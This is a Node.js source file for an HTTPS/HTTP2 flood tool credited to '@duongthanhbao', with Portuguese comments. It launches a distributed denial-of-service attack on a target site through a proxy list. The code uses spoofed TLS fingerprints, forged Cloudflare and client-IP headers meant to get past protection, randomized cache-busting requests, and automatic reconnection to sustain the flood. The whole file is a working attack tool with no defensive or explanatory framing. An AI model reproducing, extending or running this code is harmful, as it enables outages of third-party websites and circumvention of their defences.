const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");
const colors = require("colors");
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");
const accept_header = [ 
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    '"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  ],

  cache_header = [
    'max-age=0',
    'no-cache',
    'no-store',
    'pre-check=0',
    'post-check=0',
    'must-revalidate',
    'proxy-revalidate',
    's-maxage=604800',
    'no-cache, no-store,private, max-age=0, must-revalidate',
    'no-cache, no-store,private, s-maxage=604800, must-revalidate',
    'no-cache, no-store,private, max-age=604800, must-revalidate',
  ]
language_header = [
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5',
    'nl-NL,nl;q=0.9',
    'nn-NO,nn;q=0.9',
    'or-IN,or;q=0.9',
    'pa-IN,pa;q=0.9',
    'pl-PL,pl;q=0.9',
    'pt-BR,pt;q=0.9',
    'pt-PT,pt;q=0.9',
    'ro-RO,ro;q=0.9',
    'ru-RU,ru;q=0.9',
    'si-LK,si;q=0.9',
    'sk-SK,sk;q=0.9',
    'sl-SI,sl;q=0.9',
    'sq-AL,sq;q=0.9',
    'sr-Cyrl-RS,sr;q=0.9',
    'sr-Latn-RS,sr;q=0.9',
    'sv-SE,sv;q=0.9',
    'sw-KE,sw;q=0.9',
    'ta-IN,ta;q=0.9',
    'te-IN,te;q=0.9',
    'th-TH,th;q=0.9',
    'tr-TR,tr;q=0.9',
    'uk-UA,uk;q=0.9',
    'ur-PK,ur;q=0.9',
    'uz-Latn-UZ,uz;q=0.9',
    'vi-VN,vi;q=0.9',
    'zh-CN,zh;q=0.9',
    'zh-HK,zh;q=0.9',
    'zh-TW,zh;q=0.9',
    'am-ET,am;q=0.8',
    'as-IN,as;q=0.8',
    'az-Cyrl-AZ,az;q=0.8',
    'bn-BD,bn;q=0.8',
    'bs-Cyrl-BA,bs;q=0.8',
    'bs-Latn-BA,bs;q=0.8',
    'dz-BT,dz;q=0.8',
    'fil-PH,fil;q=0.8',
    'fr-CA,fr;q=0.8',
    'fr-CH,fr;q=0.8',
    'fr-BE,fr;q=0.8',
    'fr-LU,fr;q=0.8',
    'gsw-CH,gsw;q=0.8',
    'ha-Latn-NG,ha;q=0.8',
    'hr-BA,hr;q=0.8',
    'ig-NG,ig;q=0.8',
    'ii-CN,ii;q=0.8',
    'is-IS,is;q=0.8',
    'jv-Latn-ID,jv;q=0.8',
    'ka-GE,ka;q=0.8',
    'kkj-CM,kkj;q=0.8',
    'kl-GL,kl;q=0.8',
    'km-KH,km;q=0.8',
    'kok-IN,kok;q=0.8',
    'ks-Arab-IN,ks;q=0.8',
    'lb-LU,lb;q=0.8',
    'ln-CG,ln;q=0.8',
    'mn-Mong-CN,mn;q=0.8',
    'mr-MN,mr;q=0.8',
    'ms-BN,ms;q=0.8',
    'mt-MT,mt;q=0.8',
    'mua-CM,mua;q=0.8',
    'nds-DE,nds;q=0.8',
    'ne-IN,ne;q=0.8',
    'nso-ZA,nso;q=0.8',
    'oc-FR,oc;q=0.8',
    'pa-Arab-PK,pa;q=0.8',
    'ps-AF,ps;q=0.8',
    'quz-BO,quz;q=0.8',
    'quz-EC,quz;q=0.8',
    'quz-PE,quz;q=0.8',
    'rm-CH,rm;q=0.8',
    'rw-RW,rw;q=0.8',
    'sd-Arab-PK,sd;q=0.8',
    'se-NO,se;q=0.8',
    'si-LK,si;q=0.8',
    'smn-FI,smn;q=0.8',
    'sms-FI,sms;q=0.8',
    'syr-SY,syr;q=0.8',
    'tg-Cyrl-TJ,tg;q=0.8',
    'ti-ER,ti;q=0.8',
    'tk-TM,tk;q=0.8',
    'tn-ZA,tn;q=0.8',
    'ug-CN,ug;q=0.8',
    'uz-Cyrl-UZ,uz;q=0.8',
    've-ZA,ve;q=0.8',
    'wo-SN,wo;q=0.8',
    'xh-ZA,xh;q=0.8',
    'yo-NG,yo;q=0.8',
    'zgh-MA,zgh;q=0.8',
    'zu-ZA,zu;q=0.8',
  ];
  const fetch_site = [
    "same-origin"
    , "same-site"
    , "cross-site"
    , "none"
  ];
  const fetch_mode = [
    "navigate"
    , "same-origin"
    , "no-cors"
    , "cors"
  , ];
  const fetch_dest = [
    "document"
    , "sharedworker"
    , "subresource"
    , "unknown"
    , "worker", ];
    const cplist = [
  "TLS_AES_128_CCM_8_SHA256",
  "ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES",
  "TLS_AES_128_CCM_SHA256",
  "ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES",
  "TLS_CHACHA20_POLY1305_SHA256",
  "TLS_AES_256_GCM_SHA384",
  "ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES",
  "TLS_AES_128_GCM_SHA256",
  "ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES",
  "ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES",
  "ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES",
  "ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES"
 ];
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
  process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 const sigalgs = [
     "ecdsa_secp256r1_sha256",
          "rsa_pss_rsae_sha256",
          "rsa_pkcs1_sha256",
          "ecdsa_secp384r1_sha384",
          "rsa_pss_rsae_sha384",
          "rsa_pkcs1_sha384",
          "rsa_pss_rsae_sha512",
          "rsa_pkcs1_sha512"
]
  let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions =
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.SSL_OP_NO_TLSv1_3 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
 crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
 crypto.constants.SSL_OP_COOKIE_EXCHANGE |
 crypto.constants.SSL_OP_PKCS1_CHECK_1 |
 crypto.constants.SSL_OP_PKCS1_CHECK_2 |
 crypto.constants.SSL_OP_SINGLE_DH_USE |
 crypto.constants.SSL_OP_SINGLE_ECDH_USE |
 crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 if (process.argv.length < 7){console.log(`Usage: host time req thread proxy.txt`); process.exit();}
 const secureProtocol = "TLS_method";
 const headers = {};

 const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: SignalsList,
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: secureProtocol
 };

 const secureContext = tls.createSecureContext(secureContextOptions);
 const args = {
     target: process.argv[2],
     time: ~~process.argv[3],
     Rate: ~~process.argv[4],
     threads: ~~process.argv[5],
     proxyFile: process.argv[6]
 }
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);

 const MAX_RAM_PERCENTAGE = 85;
const RESTART_DELAY = 800;

 if (cluster.isMaster) {
  console.clear()
  console.log(`HTTPS-FLOOD | BY @duongthanhbao`.blue)
  console.log(`Attack Successfully Sent`.rainbow)
  console.log(`--------------------------------------------`)
  console.log(` - Target: `.brightYellow + process.argv[2].italic)
  console.log(` - Time: `.brightYellow + process.argv[3].italic)
  console.log(` - Rate: `.brightYellow + process.argv[4].italic)
  console.log(` - Thread: `.brightYellow + process.argv[5].italic)
  console.log(` - ProxyFile: `.brightYellow + process.argv[6].italic)
  console.log(`--------------------------------------------`)
  console.log(`\x1b[3m\x1b[34m@duongthanhbao\x1b[0m: super https-flood custom 1/1 with high rq/s`);
    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }

        console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;

        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };
	setInterval(handleRAMUsage, 3000);
	
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    for (let i = 0; i < 10; i++) {
        setInterval(runFlooder, 50);
    }
}

 class NetSocket {
     constructor(){}

  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
     const connection = net.connect({
        host: options.host,
        port: options.port,
    });

    connection.setTimeout(options.timeout * 1000000);
    connection.setKeepAlive(true, 1000000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
       connection.write(buffer);
   });

   connection.on("data", chunk => {
       const response = chunk.toString("utf-8");
       const isAlive = response.includes("HTTP/1.1 200");
       if (isAlive === false) {
           connection.destroy();
           return callback(undefined, "error: invalid response from proxy server");
       }
       return callback(connection, undefined);
   });

   connection.on("timeout", () => {
       connection.destroy();
       return callback(undefined, "error: timeout exceeded");
   });

}
}
function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

 const Socker = new NetSocket();

 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 function getRandomValue(arr) {
    const randomIndex = Math.floor(Math.random() * arr.length);
    return arr[randomIndex];
  }
  function randstra(length) {
const characters = "0123456789";
let result = "";
const charactersLength = characters.length;
for (let i = 0; i < length; i++) {
result += characters.charAt(Math.floor(Math.random() * charactersLength));
}
return result;
}

 function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
 function randstrs(length) {
    const characters = "0123456789";
    const charactersLength = characters.length;
    const randomBytes = crypto.randomBytes(length);
    let result = "";
    for (let i = 0; i < length; i++) {
        const randomIndex = randomBytes[i] % charactersLength;
        result += characters.charAt(randomIndex);
    }
    return result;
}
const randstrsValue = randstrs(10);

// CLOUDFLARE BYPASS AUMENTADO
const cloudflareBypassHeaders = {
    // Headers específicos do CloudFlare
    "CF-Connecting-IP": () => `${getRandomInt(1, 255)}.${getRandomInt(1, 255)}.${getRandomInt(1, 255)}.${getRandomInt(1, 255)}`,
    "CF-IPCountry": () => ["US", "BR", "UK", "DE", "FR", "CA", "AU", "JP", "SG", "NL"][Math.floor(Math.random() * 10)],
    "CF-Ray": () => crypto.randomBytes(16).toString("hex") + "-" + ["SIN", "LHR", "DFW", "ORD", "CDG", "FRA", "SYD", "NRT", "SJC", "MIA"][Math.floor(Math.random() * 10)],
    "CF-Visitor": () => JSON.stringify({scheme: "https"}),
    "CF-Cache-Status": () => ["HIT", "MISS", "EXPIRED", "STALE", "BYPASS", "REVALIDATED"][Math.floor(Math.random() * 6)],
    "CF-EW-Via": () => "",
    "CF-Request-ID": () => crypto.randomBytes(20).toString("hex"),
    
    // Headers de navegador real para bypass
    "Sec-CH-UA": () => `"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"`,
    "Sec-CH-UA-Mobile": () => "?0",
    "Sec-CH-UA-Platform": () => `"Windows"`,
    "Sec-CH-UA-Platform-Version": () => `"15.0.0"`,
    "Sec-CH-UA-Arch": () => `"x86"`,
    "Sec-CH-UA-Bitness": () => `"64"`,
    "Sec-CH-UA-Full-Version-List": () => `"Chromium";v="118.0.5993.117", "Google Chrome";v="118.0.5993.117", "Not=A?Brand";v="99.0.0.0"`,
    "Sec-CH-UA-Model": () => `""`,
    
    // Headers de segurança
    "Sec-Fetch-Dest": () => "document",
    "Sec-Fetch-Mode": () => "navigate",
    "Sec-Fetch-Site": () => ["same-origin", "cross-site", "none"][Math.floor(Math.random() * 3)],
    "Sec-Fetch-User": () => "?1",
    
    // Headers de performance
    "Service-Worker-Navigation-Preload": () => "true",
    "Save-Data": () => ["on", "off"][Math.floor(Math.random() * 2)],
    "Device-Memory": () => ["8", "4", "2", "1"][Math.floor(Math.random() * 4)],
    "DPR": () => ["2.0", "1.5", "1.0"][Math.floor(Math.random() * 3)],
    "Viewport-Width": () => `${getRandomInt(1920, 3840)}`,
    "Width": () => `${getRandomInt(1920, 3840)}`,
    
    // Headers de cookies CloudFlare
    "__cf_bm": () => crypto.randomBytes(32).toString("hex") + "." + Math.floor(Date.now() / 1000) + "-" + getRandomInt(0, 1000) + "-" + crypto.randomBytes(8).toString("hex"),
    "__cfduid": () => crypto.randomBytes(43).toString("hex"),
    "_cfuvid": () => crypto.randomBytes(24).toString("hex"),
    
    // Headers de verificação JS
    "X-Requested-With": () => "XMLHttpRequest",
    "X-Forwarded-Proto": () => "https",
    "X-Forwarded-Host": () => parsedTarget.host,
    "X-Forwarded-Port": () => "443",
    "X-Real-IP": () => `${getRandomInt(1, 255)}.${getRandomInt(1, 255)}.${getRandomInt(1, 255)}.${getRandomInt(1, 255)}`,
    "X-Client-IP": () => `${getRandomInt(1, 255)}.${getRandomInt(1, 255)}.${getRandomInt(1, 255)}.${getRandomInt(1, 255)}`,
    "True-Client-IP": () => `${getRandomInt(1, 255)}.${getRandomInt(1, 255)}.${getRandomInt(1, 255)}.${getRandomInt(1, 255)}`,
    "X-Cluster-Client-IP": () => `${getRandomInt(1, 255)}.${getRandomInt(1, 255)}.${getRandomInt(1, 255)}.${getRandomInt(1, 255)}`,
    
    // Headers de referer realista
    "Referer": () => {
        const referers = [
            `https://www.google.com/search?q=${crypto.randomBytes(8).toString("hex")}`,
            `https://www.bing.com/search?q=${crypto.randomBytes(8).toString("hex")}`,
            `https://www.youtube.com/watch?v=${crypto.randomBytes(11).toString("hex")}`,
            `https://www.facebook.com/`,
            `https://www.twitter.com/`,
            `https://www.reddit.com/`,
            `https://${parsedTarget.host}/`,
            `https://${parsedTarget.host}/index.html`,
            `https://${parsedTarget.host}/home`,
        ];
        return referers[Math.floor(Math.random() * referers.length)];
    },
    
    // Headers de conexão persistente
    "Connection": () => "keep-alive, Upgrade",
    "Upgrade-Insecure-Requests": () => "1",
    "TE": () => "Trailers",
};

  function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
  encoding_header = [
    'gzip, deflate, br'
    , 'compress, gzip'
    , 'deflate, gzip'
    , 'gzip, identity'
  ];
  function randstrr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
    function randstr(length) {
		const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		let result = "";
		const charactersLength = characters.length;
		for (let i = 0; i < length; i++) {
			result += characters.charAt(Math.floor(Math.random() * charactersLength));
		}
		return result;
	}
  function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
 const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
 const randomStringArray = Array.from({ length }, () => {
   const randomIndex = Math.floor(Math.random() * characters.length);
   return characters[randomIndex];
 });

 return randomStringArray.join('');
}

// PAYLOAD AUMENTADO
const payloads = [
    "GET {path} HTTP/2\r\n",
    "POST {path} HTTP/2\r\n",
    "HEAD {path} HTTP/2\r\n",
    "OPTIONS {path} HTTP/2\r\n",
    "PROPFIND {path} HTTP/2\r\n",
    "REPORT {path} HTTP/2\r\n",
    "MKCOL {path} HTTP/2\r\n",
    "LOCK {path} HTTP/2\r\n",
    "UNLOCK {path} HTTP/2\r\n",
    "MOVE {path} HTTP/2\r\n",
    "COPY {path} HTTP/2\r\n"
];

 const val = { 'NEl': JSON.stringify({
			"report_to": Math.random() < 0.5 ? "cf-nel" : 'default',
			"max-age": Math.random() < 0.5 ? 604800 : 2561000,
			"include_subdomains": Math.random() < 0.5 ? true : false}),
            }

            const rateHeaders = [
                {"accept" :accept_header[Math.floor(Math.random() * accept_header.length)]},
                {"Access-Control-Request-Method": "GET"},
                { "accept-language" : language_header[Math.floor(Math.random() * language_header.length)]},
                { "origin": "https://" + parsedTarget.host},
                { "source-ip": randstr(5)  },
                { "data-return" :"false"},
                {"X-Forwarded-For" : parsedProxy[0]},
                {"NEL" : val},
                {"dnt" : "1" },
                { "A-IM": "Feed" },
                {'Accept-Range': Math.random() < 0.5 ? 'bytes' : 'none'},
               {'Delta-Base' : '12340001'},
               {"te": "trailers"},
               {"accept-language": language_header[Math.floor(Math.random() * language_header.length)]},
        ];

// HEADERS OTIMIZADOS PARA CLOUDFLARE
let baseHeaders = {
  ":authority": parsedTarget.host,
  ":scheme": "https",
  ":path": parsedTarget.path + "?tbaodzs1tg" + "=" + generateRandomString(10, 25),
  ":method":  "GET",
  "pragma" : cache_header[Math.floor(Math.random() * cache_header.length)],
  "upgrade-insecure-requests" : "1",
  "accept-encoding" : encoding_header[Math.floor(Math.random() * encoding_header.length)],
  "cache-control": cache_header[Math.floor(Math.random() * cache_header.length)],
  "sec-ch-ua-mobile": "?0",
  "sec-ch-ua-platform": "Windows",
  "sec-fetch-mode": fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
  "sec-fetch-site": fetch_site[Math.floor(Math.random() * fetch_site.length)],
  "sec-fetch-dest": fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
}

// ADICIONAR HEADERS DE BYPASS
Object.keys(cloudflareBypassHeaders).forEach(key => {
    if (Math.random() > 0.3) { // 70% de chance de incluir cada header
        baseHeaders[key] = cloudflareBypassHeaders[key]();
    }
});

 const proxyOptions = {
     host: parsedProxy[0],
     port: ~~parsedProxy[1],
     address: parsedTarget.host + ":443",
     timeout: 50 // REDUZIDO PARA MAIS VELOCIDADE
 };
 Socker.HTTP(proxyOptions, (connection, error) => {
    if (error) return

    connection.setKeepAlive(true, 1000000);
    connection.setNoDelay(true)

    const settings = {
       enablePush: false,
       initialWindowSize: 2147483647, // AUMENTADO
       maxConcurrentStreams: 1000, // AUMENTADO
       maxHeaderListSize: 262144, // AUMENTADO
   };

    const tlsOptions = {
       port: parsedPort,
       secure: true,
       ALPNProtocols: ["h2", "http/1.1"], // ADICIONADO HTTP/1.1 COMO FALLBACK
       ciphers: cipper,
       sigalgs: sigalgs,
       requestCert: true,
       socket: connection,
       ecdhCurve: ecdhCurve,
       honorCipherOrder: false,
       rejectUnauthorized: false,
       secureOptions: secureOptions,
       secureContext :secureContext,
       host : parsedTarget.host,
       servername: parsedTarget.host,
       secureProtocol: secureProtocol,
       sessionTimeout: 1000,
       ticketKeys: crypto.randomBytes(48)
   };
    const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions);

    tlsConn.allowHalfOpen = true;
    tlsConn.setNoDelay(true);
    tlsConn.setKeepAlive(true, 1000000);
    tlsConn.setMaxListeners(0);

    const client = http2.connect(parsedTarget.href, {
      settings: {
        headerTableSize: 65536,
        maxHeaderListSize : 262144, // AUMENTADO
        initialWindowSize: 2147483647, // AUMENTADO
        maxFrameSize : 16384,
        maxConcurrentStreams: 1000, // AUMENTADO
    },
    createConnection: () => tlsConn,
    socket: connection,
});
client.settings({
  headerTableSize: 65536,
  maxHeaderListSize : 262144,
  initialWindowSize: 2147483647,
  maxFrameSize : 16384,
  maxConcurrentStreams: 1000,
});

client.setMaxListeners(0);
client.settings(settings);
    client.on("connect", () => {
       const IntervalAttack = setInterval(() => {
           // AUMENTADO O NÚMERO DE REQUESTS POR INTERVALO
           for (let i = 0; i < Math.max(args.Rate * 2, 50); i++) {
           
            // GERAR HEADERS DINÂMICOS
            const dynamicHeaders = {};
            Object.keys(baseHeaders).forEach(key => {
                if (typeof baseHeaders[key] === 'function') {
                    dynamicHeaders[key] = baseHeaders[key]();
                } else {
                    dynamicHeaders[key] = baseHeaders[key];
                }
            });
            
            // ADICIONAR HEADERS RANDOM
            const extraHeader = rateHeaders[Math.floor(Math.random() * rateHeaders.length)];
            Object.assign(dynamicHeaders, extraHeader);
            
            // ALTERAR PATH DINAMICAMENTE
            dynamicHeaders[":path"] = parsedTarget.path + "?" + 
                ["id", "token", "session", "auth", "key", "code", "ref", "uid"][Math.floor(Math.random() * 8)] + 
                "=" + generateRandomString(15, 30) + 
                "&_=" + Date.now() + 
                "&rnd=" + crypto.randomBytes(8).toString("hex");

            // ALTERAR MÉTODO DINAMICAMENTE
            dynamicHeaders[":method"] = ["GET", "POST", "HEAD", "OPTIONS"][Math.floor(Math.random() * 4)];

const request = client.request({
      ...dynamicHeaders,
    }, {
      parent:0,
      exclusive: true,
      weight: 255, // AUMENTADO
      endStream: false
    })
               .on('response', response => {
                   // MULTIPLOS REQUESTS POR CONEXÃO
                   for (let j = 0; j < 3; j++) {
                       const followup = client.request({
                           ...dynamicHeaders,
                           ":path": parsedTarget.path + "?followup=" + j + "&_" + Date.now()
                       });
                       followup.end();
                   }
                   
                   request.close();
                   request.destroy();
                  return
               });
               
               // ENVIAR DATA EM REQUESTS POST
               if (dynamicHeaders[":method"] === "POST") {
                   const postData = JSON.stringify({
                       timestamp: Date.now(),
                       data: crypto.randomBytes(128).toString("hex"),
                       token: crypto.randomBytes(32).toString("hex")
                   });
                   request.write(postData);
               }
               
               request.end(); 
               

           }
       }, 200); // INTERVALO REDUZIDO
    });
    
    // HANDLERS PARA RECONEXÃO RÁPIDA
    client.on("close", () => {
        setTimeout(() => {
            runFlooder();
        }, 100);
        return
    });
    
    client.on("timeout", () => {
        setTimeout(() => {
            runFlooder();
        }, 100);
        return
    });
    
    client.on("error", error => {
        setTimeout(() => {
            runFlooder();
        }, 100);
        return
    });
});
}

// MULTIPLOS WORKERS POR THREAD
for (let i = 0; i < 5; i++) {
    setImmediate(runFlooder);
}

const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {
    // RECONECTAR RAPIDAMENTE
    setTimeout(runFlooder, 50);
});
process.on('unhandledRejection', error => {
    // RECONECTAR RAPIDAMENTE
    setTimeout(runFlooder, 50);
});